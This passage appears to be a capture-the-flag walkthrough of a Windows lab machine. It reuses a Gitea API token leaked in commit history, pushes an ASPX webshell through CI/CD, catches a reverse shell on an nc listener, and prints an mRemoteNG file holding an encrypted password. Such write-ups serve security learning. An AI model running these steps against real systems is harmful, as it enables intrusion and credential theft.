+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 5m     26584/26584   97/s    http://10.129.234.64/aspnet_client/system_web/
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 4m     26584/26584   108/s   http://10.129.234.64/assets/vendor/aos/ 
+</span></code></pre></div></div>
+<p>I also often use <code class="language-plaintext highlighter-rouge">--dont-extract-links</code> because it clogs up the output with stuff that isn’t interesting. Nothing interesting here.</p>
+<h3 id="gitea---tcp-3000">Gitea - TCP 3000</h3>
+<p>The webserver on 3000 is hosting an instance of <a href="https://about.gitea.com/">Gitea</a>:</p>
+<picture>
+<source srcset="/img/image-20250815172156869.webp" type="image/webp"/>
+<img alt="image-20250815172156869" class="include_image" loading="lazy" src="/img/image-20250815172156869.png"/>
+</picture>
+<p>Under “Explore”, there’s one public repo:</p>
+<picture>
+<source srcset="/img/image-20250815172217045.webp" type="image/webp"/>
+<img alt="image-20250815172217045" class="include_image" loading="lazy" src="/img/image-20250815172217045.png"/>
+</picture>
+<p>It has a single file, and two commits:</p>
+<picture>
+<source srcset="/img/image-20250815172250296.webp" type="image/webp"/>
+<img alt="image-20250815172250296" class="include_image" loading="lazy" src="/img/image-20250815172250296.png"/>
+</picture>
+<p>The script is for listing repos on the Gitea instance using the API:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">requests</span>
+<span class="kn">import</span> <span class="n">sys</span>
+<span class="kn">import</span> <span class="n">os</span>
+
+<span class="k">def</span> <span class="nf">format_domain</span><span class="p">(</span><span class="n">domain</span><span class="p">):</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">domain</span><span class="p">.</span><span class="nf">startswith</span><span class="p">((</span><span class="sh">'</span><span class="s">http://</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">https://</span><span class="sh">'</span><span class="p">)):</span>
+        <span class="n">domain</span> <span class="o">=</span> <span class="sh">'</span><span class="s">https://</span><span class="sh">'</span> <span class="o">+</span> <span class="n">domain</span>
+    <span class="k">return</span> <span class="n">domain</span>
+
+<span class="k">def</span> <span class="nf">get_repositories</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">domain</span><span class="p">):</span>
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="sh">'</span><span class="s">Authorization</span><span class="sh">'</span><span class="p">:</span> <span class="sa">f</span><span class="sh">'</span><span class="s">token </span><span class="si">{</span><span class="n">token</span><span class="si">}</span><span class="sh">'</span>
+    <span class="p">}</span>
+    <span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="n">domain</span><span class="si">}</span><span class="s">/api/v1/user/repos</span><span class="sh">'</span>
+    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="n">response</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">response</span><span class="p">.</span><span class="nf">json</span><span class="p">()</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">raise</span> <span class="nc">Exception</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">Failed to retrieve repositories: </span><span class="si">{</span><span class="n">response</span><span class="p">.</span><span class="n">status_code</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Usage: python script.py &lt;gitea_domain&gt;</span><span class="sh">"</span><span class="p">)</span>
+        <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+    <span class="n">gitea_domain</span> <span class="o">=</span> <span class="nf">format_domain</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
+
+    <span class="n">personal_access_token</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="nf">getenv</span><span class="p">(</span><span class="sh">'</span><span class="s">GITEA_ACCESS_TOKEN</span><span class="sh">'</span><span class="p">)</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">personal_access_token</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Error: GITEA_ACCESS_TOKEN environment variable not set.</span><span class="sh">"</span><span class="p">)</span>
+        <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">repos</span> <span class="o">=</span> <span class="nf">get_repositories</span><span class="p">(</span><span class="n">personal_access_token</span><span class="p">,</span> <span class="n">gitea_domain</span><span class="p">)</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Repositories:</span><span class="sh">"</span><span class="p">)</span>
+        <span class="k">for</span> <span class="n">repo</span> <span class="ow">in</span> <span class="n">repos</span><span class="p">:</span>
+            <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">- </span><span class="si">{</span><span class="n">repo</span><span class="p">[</span><span class="sh">'</span><span class="s">full_name</span><span class="sh">'</span><span class="p">]</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Error: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
+    <span class="nf">main</span><span class="p">()</span>
+</code></pre></div></div>
+<p>It reads the API key from the OS environment variables. However, the diff for the second of the two commits shows that originally it had a hardcoded API key:</p>
+<picture>
+<source srcset="/img/image-20250815173444145.webp" type="image/webp"/>
+<img alt="image-20250815173444145" class="include_image" loading="lazy" src="/img/image-20250815173444145.png"/>
+</picture>
+<h2 id="shell-as-ellenfreeman">Shell as ellen.freeman</h2>
+<h3 id="enumerate-gitea">Enumerate Gitea</h3>
+<h4 id="repos">Repos</h4>
+<p>The script with the key leaked from the commit works to enumerate repos:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">export </span><span class="nv">GITEA_ACCESS_TOKEN</span><span class="o">=</span>43ce39bb0bd6bc489284f2905f033ca467a6362f
+<span class="gp">oxdf@hacky$</span><span class="w"> </span>python repos.py http://10.129.234.64:3000
+<span class="go">Repositories:
+- ellen.freeman/dev-scripts
+- ellen.freeman/website
+</span></code></pre></div></div>
+<p>There are two, including the public repo I am accessing. I don’t really need this script. <code class="language-plaintext highlighter-rouge">curl</code> works too:</p>
+<div class="language-console code-collapse highlighter-rouge" data-trunc="300"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl http://10.129.234.64:3000/api/v1/user/repos <span class="nt">-H</span> <span class="s2">"Authorization: Bearer 43ce39bb0bd6bc489284f2905f033ca467a6362f"</span> <span class="nt">-s</span> | jq <span class="nb">.</span>
+<span class="go">[
+  {
+    "id": 1,
+    "owner": {
+      "id": 2,
+      "login": "ellen.freeman",
+      "login_name": "",
+      "full_name": "",
+      "email": "ellen.freeman@lock.vl",
+      "avatar_url": "http://localhost:3000/avatar/1aea7e43e6bb8891439a37854255ed74",
+      "language": "",
+      "is_admin": false,
+      "last_login": "0001-01-01T00:00:00Z",
+      "created": "2023-12-27T11:13:10-08:00",
+      "restricted": false,
+      "active": false,
+      "prohibit_login": false,
+      "location": "",
+      "website": "",
+      "description": "",
+      "visibility": "public",
+      "followers_count": 0,
+      "following_count": 0,
+      "starred_repos_count": 0,
+      "username": "ellen.freeman"
+    },
+    "name": "dev-scripts",
+    "full_name": "ellen.freeman/dev-scripts",
+    "description": "",
+    "empty": false,
+    "private": false,
+    "fork": false,
+    "template": false,
+    "parent": null,
+    "mirror": false,
+    "size": 29,
+    "language": "Python",
+    "languages_url": "http://localhost:3000/api/v1/repos/ellen.freeman/dev-scripts/languages",
+    "html_url": "http://localhost:3000/ellen.freeman/dev-scripts",
+    "url": "http://localhost:3000/api/v1/repos/ellen.freeman/dev-scripts",
+    "link": "",
+    "ssh_url": "ellen.freeman@localhost:ellen.freeman/dev-scripts.git",
+    "clone_url": "http://localhost:3000/ellen.freeman/dev-scripts.git",
+    "original_url": "",
+    "website": "",
+    "stars_count": 0,
+    "forks_count": 0,
+    "watchers_count": 1,
+    "open_issues_count": 0,
+    "open_pr_counter": 0,
+    "release_counter": 0,
+    "default_branch": "main",
+    "archived": false,
+    "created_at": "2023-12-27T11:17:47-08:00",
+    "updated_at": "2023-12-27T11:36:42-08:00",
+    "archived_at": "1969-12-31T16:00:00-08:00",
+    "permissions": {
+      "admin": true,
+      "push": true,
+      "pull": true
+    },
+    "has_issues": true,
+    "internal_tracker": {
+      "enable_time_tracker": true,
+      "allow_only_contributors_to_track_time": true,
+      "enable_issue_dependencies": true
+    },
+    "has_wiki": true,
+    "has_pull_requests": true,
+    "has_projects": true,
+    "has_releases": true,
+    "has_packages": true,
+    "has_actions": false,
+    "ignore_whitespace_conflicts": false,
+    "allow_merge_commits": true,
+    "allow_rebase": true,
+    "allow_rebase_explicit": true,
+    "allow_squash_merge": true,
+    "allow_rebase_update": true,
+    "default_delete_branch_after_merge": false,
+    "default_merge_style": "merge",
+    "default_allow_maintainer_edit": false,
+    "avatar_url": "",
+    "internal": false,
+    "mirror_interval": "",
+    "mirror_updated": "0001-01-01T00:00:00Z",
+    "repo_transfer": null
+  },
+  {
+    "id": 5,
+    "owner": {
+      "id": 2,
+      "login": "ellen.freeman",
+      "login_name": "",
+      "full_name": "",
+      "email": "ellen.freeman@lock.vl",
+      "avatar_url": "http://localhost:3000/avatar/1aea7e43e6bb8891439a37854255ed74",
+      "language": "",
+      "is_admin": false,
+      "last_login": "0001-01-01T00:00:00Z",
+      "created": "2023-12-27T11:13:10-08:00",
+      "restricted": false,
+      "active": false,
+      "prohibit_login": false,
+      "location": "",
+      "website": "",
+      "description": "",
+      "visibility": "public",
+      "followers_count": 0,
+      "following_count": 0,
+      "starred_repos_count": 0,
+      "username": "ellen.freeman"
+    },
+    "name": "website",
+    "full_name": "ellen.freeman/website",
+    "description": "",
+    "empty": false,
+    "private": true,
+    "fork": false,
+    "template": false,
+    "parent": null,
+    "mirror": false,
+    "size": 7370,
+    "language": "CSS",
+    "languages_url": "http://localhost:3000/api/v1/repos/ellen.freeman/website/languages",
+    "html_url": "http://localhost:3000/ellen.freeman/website",
+    "url": "http://localhost:3000/api/v1/repos/ellen.freeman/website",
+    "link": "",
+    "ssh_url": "ellen.freeman@localhost:ellen.freeman/website.git",
+    "clone_url": "http://localhost:3000/ellen.freeman/website.git",
+    "original_url": "",
+    "website": "",
+    "stars_count": 0,
+    "forks_count": 0,
+    "watchers_count": 1,
+    "open_issues_count": 0,
+    "open_pr_counter": 0,
+    "release_counter": 0,
+    "default_branch": "main",
+    "archived": false,
+    "created_at": "2023-12-27T12:04:52-08:00",
+    "updated_at": "2024-01-18T10:17:46-08:00",
+    "archived_at": "1969-12-31T16:00:00-08:00",
+    "permissions": {
+      "admin": true,
+      "push": true,
+      "pull": true
+    },
+    "has_issues": true,
+    "internal_tracker": {
+      "enable_time_tracker": true,
+      "allow_only_contributors_to_track_time": true,
+      "enable_issue_dependencies": true
+    },
+    "has_wiki": true,
+    "has_pull_requests": true,
+    "has_projects": true,
+    "has_releases": true,
+    "has_packages": true,
+    "has_actions": false,
+    "ignore_whitespace_conflicts": false,
+    "allow_merge_commits": true,
+    "allow_rebase": true,
+    "allow_rebase_explicit": true,
+    "allow_squash_merge": true,
+    "allow_rebase_update": true,
+    "default_delete_branch_after_merge": false,
+    "default_merge_style": "merge",
+    "default_allow_maintainer_edit": false,
+    "avatar_url": "",
+    "internal": false,
+    "mirror_interval": "",
+    "mirror_updated": "0001-01-01T00:00:00Z",
+    "repo_transfer": null
+  }
+]
+</span></code></pre></div></div>
+<h4 id="website-enumeration">website Enumeration</h4>
+<p>The API is fully documented at <code class="language-plaintext highlighter-rouge">/api/swagger</code>:</p>
+<picture>
+<source srcset="/img/image-20250816122536352.webp" type="image/webp"/>
+<img alt="image-20250816122536352" class="include_image" loading="lazy" src="/img/image-20250816122536352.png"/>
+</picture>
+<p>For example, I can list the contents of a repo:</p>
+<picture>
+<source srcset="/img/image-20250816122839609.webp" type="image/webp"/>
+<img alt="image-20250816122839609" class="include_image" loading="lazy" src="/img/image-20250816122839609.png"/>
+</picture>
+<p>That works:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl http://10.129.234.64:3000/api/v1/repos/ellen.freeman/website/contents <span class="nt">-H</span> <span class="s2">"Authorization: Bearer 43ce39bb0bd6bc489284f2905f033ca467a6362f"</span> <span class="nt">-s</span> | jq <span class="nt">-r</span> .[].name
+<span class="go">assets
+changelog.txt
+index.html
+readme.md
+</span></code></pre></div></div>
+<p>I can grab the <code class="language-plaintext highlighter-rouge">readme.md</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl http://10.129.234.64:3000/api/v1/repos/ellen.freeman/website/contents/readme.md <span class="nt">-H</span> <span class="s2">"Authorization: Bearer 43ce39bb0bd6bc489284f2905f033ca467a6362f"</span> <span class="nt">-s</span> | jq <span class="nb">.</span>
+<span class="go">{
+  "name": "readme.md",
+  "path": "readme.md",
+  "sha": "69e5754e65607d08739dd57d2c70f378d8d051c1",
+  "last_commit_sha": "657a342b7a68f195f421c5750b837dfa390ea6c1",
+  "type": "file",
+  "size": 130,
+  "encoding": "base64",
+  "content": "IyBOZXcgUHJvamVjdCBXZWJzaXRlCgpDSS9DRCBpbnRlZ3JhdGlvbiBpcyBub3cgYWN0aXZlIC0gY2hhbmdlcyB0byB0aGUgcmVwb3NpdG9yeSB3aWxsIGF1dG9tYXRpY2FsbHkgYmUgZGVwbG95ZWQgdG8gdGhlIHdlYnNlcnZlcg==",
+  "target": null,
+  "url": "http://localhost:3000/api/v1/repos/ellen.freeman/website/contents/readme.md?ref=main",
+  "html_url": "http://localhost:3000/ellen.freeman/website/src/branch/main/readme.md",
+  "git_url": "http://localhost:3000/api/v1/repos/ellen.freeman/website/git/blobs/69e5754e65607d08739dd57d2c70f378d8d051c1",
+  "download_url": "http://localhost:3000/ellen.freeman/website/raw/branch/main/readme.md",
+  "submodule_git_url": null,
+  "_links": {
+    "self": "http://localhost:3000/api/v1/repos/ellen.freeman/website/contents/readme.md?ref=main",
+    "git": "http://localhost:3000/api/v1/repos/ellen.freeman/website/git/blobs/69e5754e65607d08739dd57d2c70f378d8d051c1",
+    "html": "http://localhost:3000/ellen.freeman/website/src/branch/main/readme.md"
+  }
+}
+</span></code></pre></div></div>
+<p>The contents is stored base64 encoded. I’ll decode it:</p>
+<div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl http://10.129.234.64:3000/api/v1/repos/ellen.freeman/website/contents/readme.md <span class="nt">-H</span> <span class="s2">"Authorization: Bearer 43ce39bb0bd6bc489284f2905f033ca467a6362f"</span> <span class="nt">-s</span> | jq .content <span class="nt">-r</span> | <span class="nb">base64</span> <span class="nt">-d</span>
+<span class="c"># New Project Website
+</span><span class="go">
+CI/CD integration is now active - changes to the repository will automatically be deployed to the webserver
+</span></code></pre></div></div>
+<p>The simplest path forward is to clone the repo using the token in the URL:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>git clone http://43ce39bb0bd6bc489284f2905f033ca467a6362f@10.129.234.64:3000/ellen.freeman/website.git
+<span class="go">Cloning into 'website'...
+remote: Enumerating objects: 165, done.
+remote: Counting objects: 100% (165/165), done.
+remote: Compressing objects: 100% (128/128), done.
+remote: Total 165 (delta 35), reused 153 (delta 31), pack-reused 0
+Receiving objects: 100% (165/165), 7.16 MiB | 1.75 MiB/s, done.
+Resolving deltas: 100% (35/35), done.
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">ls </span>website/
+<span class="go">assets  changelog.txt  index.html  readme.md
+</span></code></pre></div></div>
+<h3 id="shell">Shell</h3>
+<h4 id="upload-webshell">Upload Webshell</h4>
+<p>With access to the site source, and a message that says that CICD is working to re-publish anything that’s pushed, I’ll make a webshell, commit it, and push it.</p>
+<p>I noted <a href="#tech-stack">above</a> that the site headers showed it was running ASP.NET. I’ll grab an <a href="https://github.com/grov/webshell/blob/master/webshell-LT.aspx">ASPX webshell</a> from GitHub and save a copy in the repo. It shows as not tracked by Git:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>git status 
+<span class="go">On branch main
+Your branch is up to date with 'origin/main'.
+
+Untracked files:
+  (use "git add &lt;file&gt;..." to include in what will be committed)
+        0xdf.aspx
+
+nothing added to commit but untracked files present (use "git add" to track)
+</span></code></pre></div></div>
+<p>I’ll add it and commit it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>git add 0xdf.aspx 
+<span class="gp">oxdf@hacky$</span><span class="w"> </span>git commit <span class="nt">-m</span> <span class="s2">"nothing to see here"</span>
+<span class="go">[main 55df164] nothing to see here
+ 1 file changed, 161 insertions(+)
+ create mode 100644 0xdf.aspx
+</span></code></pre></div></div>
+<p>If git returns an error about not having an identity, I’ll run the commands it gives to set an arbitrary email and name, and commit again. Now I push, sending it to the server:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>git push
+<span class="go">Enumerating objects: 4, done.
+Counting objects: 100% (4/4), done.
+Delta compression using up to 12 threads
+Compressing objects: 100% (3/3), done.
+Writing objects: 100% (3/3), 2.07 KiB | 2.07 MiB/s, done.
+Total 3 (delta 1), reused 0 (delta 0), pack-reused 0
+remote: . Processing 1 references
+remote: Processed 1 references in total
+To http://10.129.234.64:3000/ellen.freeman/website.git
+   73cdcc1..55df164  main -&gt; main
+</span></code></pre></div></div>
+<p>Within a few seconds, it’s on the site:</p>
+<picture>
+<source srcset="/img/image-20250816124003573.webp" type="image/webp"/>
+<img alt="image-20250816124003573" class="include_image" loading="lazy" src="/img/image-20250816124003573.png"/>
+</picture>
+<h4 id="reverse-shell">Reverse Shell</h4>
+<p>I’ll get a reverse shell by grabbing a copy of PowerShell #3 (Base64) from <a href="https://www.revshells.com/">revshells.com</a> and pasting it into the box next to the “Execute” button. At my <code class="language-plaintext highlighter-rouge">nc</code>, I get a shell:</p>
+<div class="language-console rlwrap-disclaimer highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>rlwrap <span class="nt">-cAr</span> nc <span class="nt">-lnvp</span> 443
+<span class="go">Listening on 0.0.0.0 443
+Connection received on 10.129.234.64 65320
+
+</span><span class="gp">PS C:\inetpub\wwwroot&gt;</span><span class="w"> </span><span class="nb">whoami</span>
+<span class="go">lock\ellen.freeman
+</span></code></pre></div></div>
+<h2 id="shell-as-galedekarios">Shell as gale.dekarios</h2>
+<h3 id="enumeration">Enumeration</h3>
+<h4 id="home-directories">Home Directories</h4>
+<p>There’s one other interesting non-admin user with a home directory in <code class="language-plaintext highlighter-rouge">/Users</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\Users&gt;</span><span class="w"> </span><span class="n">ls</span><span class="w">
+</span><span class="go">
+    Directory: C:\Users
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----        12/27/2023   2:00 PM                .NET v4.5
+d-----        12/27/2023   2:00 PM                .NET v4.5 Classic
+d-----        12/27/2023  12:01 PM                Administrator
+d-----        12/28/2023  11:36 AM                ellen.freeman
+d-----        12/28/2023   6:14 AM                gale.dekarios
+d-r---        12/27/2023  10:21 AM                Public  
+</span></code></pre></div></div>
+<p>ellen.freeman has access to their directory and <code class="language-plaintext highlighter-rouge">Public</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\Users&gt;</span><span class="w"> </span><span class="n">tree</span><span class="w"> </span><span class="nx">/f</span><span class="w"> </span><span class="o">.</span><span class="w">
+</span><span class="go">Folder PATH listing
+Volume serial number is 0000022C 8592:A9D9
+C:\USERS
++---.NET v4.5
++---.NET v4.5 Classic
++---Administrator
++---ellen.freeman
+?   ?   .git-credentials
+?   ?   .gitconfig
+?   ?   
+?   +---.ssh
+?   ?       authorized_keys
+?   ?       
+?   +---3D Objects
+?   +---Contacts
+?   +---Desktop
+?   +---Documents
+?   ?       config.xml
+?   ?       
+?   +---Downloads
+?   +---Favorites
+?   ?   ?   Bing.url
+?   ?   ?   
+?   ?   +---Links
+?   +---Links
+?   ?       Desktop.lnk
+?   ?       Downloads.lnk
+?   ?       
+?   +---Music
+?   +---Pictures
+?   +---Saved Games
+?   +---Searches
+?   +---Videos
++---gale.dekarios
++---Public
+    +---Documents
+    +---Downloads
+    +---Music
+    +---Pictures
+    +---Videos
+</span></code></pre></div></div>
+<p>There’s nothing in <code class="language-plaintext highlighter-rouge">Public</code>, but there is a file in their <code class="language-plaintext highlighter-rouge">Documents</code> folder that could be interesting.</p>
+<h4 id="configxml">config.xml</h4>
+<p>This file is an <a href="https://mremoteng.org/">mRemoteNG</a> connection configuration file (the second line has a reference to the mRemoteNG website):</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span>
+<span class="nt">&lt;mrng:Connections</span> <span class="na">xmlns:mrng=</span><span class="s">"http://mremoteng.org"</span> <span class="na">Name=</span><span class="s">"Connections"</span> <span class="na">Export=</span><span class="s">"false"</span> <span class="na">EncryptionEngine=</span><span class="s">"AES"</span> <span class="na">BlockCipherMode=</span><span class="s">"GCM"</span> <span class="na">KdfIterations=</span><span class="s">"1000"</span> <span class="na">FullFileEncryption=</span><span class="s">"false"</span> <span class="na">Protected=</span><span class="s">"sDkrKn0JrG4oAL4GW8BctmMNAJfcdu/ahPSQn3W5DPC3vPRiNwfo7OH11trVPbhwpy+1FnqfcPQZ3olLRy+DhDFp"</span> <span class="na">ConfVersion=</span><span class="s">"2.6"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;Node</span> <span class="na">Name=</span><span class="s">"RDP/Gale"</span> <span class="na">Type=</span><span class="s">"Connection"</span> <span class="na">Descr=</span><span class="s">""</span> <span class="na">Icon=</span><span class="s">"mRemoteNG"</span> <span class="na">Panel=</span><span class="s">"General"</span> <span class="na">Id=</span><span class="s">"a179606a-a854-48a6-9baa-491d8eb3bddc"</span> <span class="na">Username=</span><span class="s">"Gale.Dekarios"</span> <span class="na">Domain=</span><span class="s">""</span> <span class="na">Password=</span><span class="s">"TYkZkvR2YmVlm2T2jBYTEhPU2VafgW1d9NSdDX+hUYwBePQ/2qKx+57IeOROXhJxA7CczQzr1nRm89JulQDWPw=="</span> <span class="na">Hostname=</span><span class="s">"Lock"</span> <span class="na">Protocol=</span><span class="s">"RDP"</span> <span class="na">PuttySession=</span><span class="s">"Default Settings"</span> <span class="na">Port=</span><span class="s">"3389"</span> <span class="na">ConnectToConsole=</span><span class="s">"false"</span> <span class="na">UseCredSsp=</span><span class="s">"true"</span> <span class="na">RenderingEngine=</span><span class="s">"IE"</span> <span class="na">ICAEncryptionStrength=</span><span class="s">"EncrBasic"</span> <span class="na">RDPAuthenticationLevel=</span><span class="s">"NoAuth"</span> <span class="na">RDPMinutesToIdleTimeout=</span><span class="s">"0"</span> <span class="na">RDPAlertIdleTimeout=</span><span class="s">"false"</span> <span class="na">LoadBalanceInfo=</span><span class="s">""</span> <span class="na">Colors=</span><span class="s">"Colors16Bit"</span> <span class="na">Resolution=</span><span class="s">"FitToWindow"</span> <span class="na">AutomaticResize=</span><span class="s">"true"</span> <span class="na">DisplayWallpaper=</span><span class="s">"false"</span> <span class="na">DisplayThemes=</span><span class="s">"false"</span> <span class="na">EnableFontSmoothing=</span><span class="s">"false"</span> <span class="na">EnableDesktopComposition=</span><span class="s">"false"</span> <span class="na">CacheBitmaps=</span><span class="s">"false"</span> <span class="na">RedirectDiskDrives=</span><span class="s">"false"</span> <span class="na">RedirectPorts=</span><span class="s">"false"</span> <span class="na">RedirectPrinters=</span><span class="s">"false"</span> <span class="na">RedirectSmartCards=</span><span class="s">"false"</span> <span class="na">RedirectSound=</span><span class="s">"DoNotPlay"</span> <span class="na">SoundQuality=</span><span class="s">"Dynamic"</span> <span class="na">RedirectKeys=</span><span class="s">"false"</span> <span class="na">Connected=</span><span class="s">"false"</span> <span class="na">PreExtApp=</span><span class="s">""</span> <span class="na">PostExtApp=</span><span class="s">""</span> <span class="na">MacAddress=</span><span class="s">""</span> <span class="na">UserField=</span><span class="s">""</span> <span class="na">ExtApp=</span><span class="s">""</span> <span class="na">VNCCompression=</span><span class="s">"CompNone"</span> <span class="na">VNCEncoding=</span><span class="s">"EncHextile"</span> <span class="na">VNCAuthMode=</span><span class="s">"AuthVNC"</span> <span class="na">VNCProxyType=</span><span class="s">"ProxyNone"</span> <span class="na">VNCProxyIP=</span><span class="s">""</span> <span class="na">VNCProxyPort=</span><span class="s">"0"</span> <span class="na">VNCProxyUsername=</span><span class="s">""</span> <span class="na">VNCProxyPassword=</span><span class="s">""</span> <span class="na">VNCColors=</span><span class="s">"ColNormal"</span> <span class="na">VNCSmartSizeMode=</span><span class="s">"SmartSAspect"</span> <span class="na">VNCViewOnly=</span><span class="s">"false"</span> <span class="na">RDGatewayUsageMethod=</span><span class="s">"Never"</span> <span class="na">RDGatewayHostname=</span><span class="s">""</span> <span class="na">RDGatewayUseConnectionCredentials=</span><span class="s">"Yes"</span> <span class="na">RDGatewayUsername=</span><span class="s">""</span> <span class="na">RDGatewayPassword=</span><span class="s">""</span> <span class="na">RDGatewayDomain=</span><span class="s">""</span> <span class="na">InheritCacheBitmaps=</span><span class="s">"false"</span> <span class="na">InheritColors=</span><span class="s">"false"</span> <span class="na">InheritDescription=</span><span class="s">"false"</span> <span class="na">InheritDisplayThemes=</span><span class="s">"false"</span> <span class="na">InheritDisplayWallpaper=</span><span class="s">"false"</span> <span class="na">InheritEnableFontSmoothing=</span><span class="s">"false"</span> <span class="na">InheritEnableDesktopComposition=</span><span class="s">"false"</span> <span class="na">InheritDomain=</span><span class="s">"false"</span> <span class="na">InheritIcon=</span><span class="s">"false"</span> <span class="na">InheritPanel=</span><span class="s">"false"</span> <span class="na">InheritPassword=</span><span class="s">"false"</span> <span class="na">InheritPort=</span><span class="s">"false"</span> <span class="na">InheritProtocol=</span><span class="s">"false"</span> <span class="na">InheritPuttySession=</span><span class="s">"false"</span> <span class="na">InheritRedirectDiskDrives=</span><span class="s">"false"</span> <span class="na">InheritRedirectKeys=</span><span class="s">"false"</span> <span class="na">InheritRedirectPorts=</span><span class="s">"false"</span> <span class="na">InheritRedirectPrinters=</span><span class="s">"false"</span> <span class="na">InheritRedirectSmartCards=</span><span class="s">"false"</span> <span class="na">InheritRedirectSound=</span><span class="s">"false"</span> <span class="na">InheritSoundQuality=</span><span class="s">"false"</span> <span class="na">InheritResolution=</span><span class="s">"false"</span> <span class="na">InheritAutomaticResize=</span><span class="s">"false"</span> <span class="na">InheritUseConsoleSession=</span><span class="s">"false"</span> <span class="na">InheritUseCredSsp=</span><span class="s">"false"</span> <span class="na">InheritRenderingEngine=</span><span class="s">"false"</span> <span class="na">InheritUsername=</span><span class="s">"false"</span> <span class="na">InheritICAEncryptionStrength=</span><span class="s">"false"</span> <span class="na">InheritRDPAuthenticationLevel=</span><span class="s">"false"</span> <span class="na">InheritRDPMinutesToIdleTimeout=</span><span class="s">"false"</span> <span class="na">InheritRDPAlertIdleTimeout=</span><span class="s">"false"</span> <span class="na">InheritLoadBalanceInfo=</span><span class="s">"false"</span> <span class="na">InheritPreExtApp=</span><span class="s">"false"</span> <span class="na">InheritPostExtApp=</span><span class="s">"false"</span> <span class="na">InheritMacAddress=</span><span class="s">"false"</span> <span class="na">InheritUserField=</span><span class="s">"false"</span> <span class="na">InheritExtApp=</span><span class="s">"false"</span> <span class="na">InheritVNCCompression=</span><span class="s">"false"</span> <span class="na">InheritVNCEncoding=</span><span class="s">"false"</span> <span class="na">InheritVNCAuthMode=</span><span class="s">"false"</span> <span class="na">InheritVNCProxyType=</span><span class="s">"false"</span> <span class="na">InheritVNCProxyIP=</span><span class="s">"false"</span> <span class="na">InheritVNCProxyPort=</span><span class="s">"false"</span> <span class="na">InheritVNCProxyUsername=</span><span class="s">"false"</span> <span class="na">InheritVNCProxyPassword=</span><span class="s">"false"</span> <span class="na">InheritVNCColors=</span><span class="s">"false"</span> <span 